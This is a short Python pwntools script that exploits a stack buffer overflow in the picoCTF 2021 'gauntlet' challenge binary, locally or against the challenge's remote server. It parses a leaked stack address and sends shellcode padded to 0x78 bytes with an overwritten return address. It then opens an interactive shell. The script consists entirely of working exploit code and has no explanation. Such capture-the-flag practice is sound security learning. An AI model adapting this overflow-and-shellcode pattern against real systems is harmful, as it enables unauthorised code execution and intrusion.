from pwn import *
import pwnlib

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"
# destaddr = 0x7fffffffeb40
# shelladdr = destaddr + 0x78+
if args.REMOTE:
    p = remote("mercury.picoctf.net", 19968)
else:
    p = process("./gauntlet")

formatP = 0x4007D4
mainaddr = 0x400687
dest = p.recvline()
destaddr = int(dest[:-1].decode(), 16)
# print(len(dest), destaddr, hex(destaddr))
shelladdr = destaddr+0x78+8
p.success(hex(shelladdr))

shellcode = asm(shellcraft.amd64.sh())
# print(shellcode)
# payload = b'a'*0x78 + p64(shelladdr) + shellcode
# payload = b'a'*0x78 + p64(0x400687)
payload = shellcode.ljust(0x78, b'a')+p64(destaddr)

p.sendline("test")
p.recvline()

# pwnlib.gdb.attach(proc.pidof(p)[0], 'b *0x700748')
p.sendline(payload)
p.interactive()

# /mnt/d/zyFiles/Learning/Interests/zyctf/ctfGames/picoctf2021/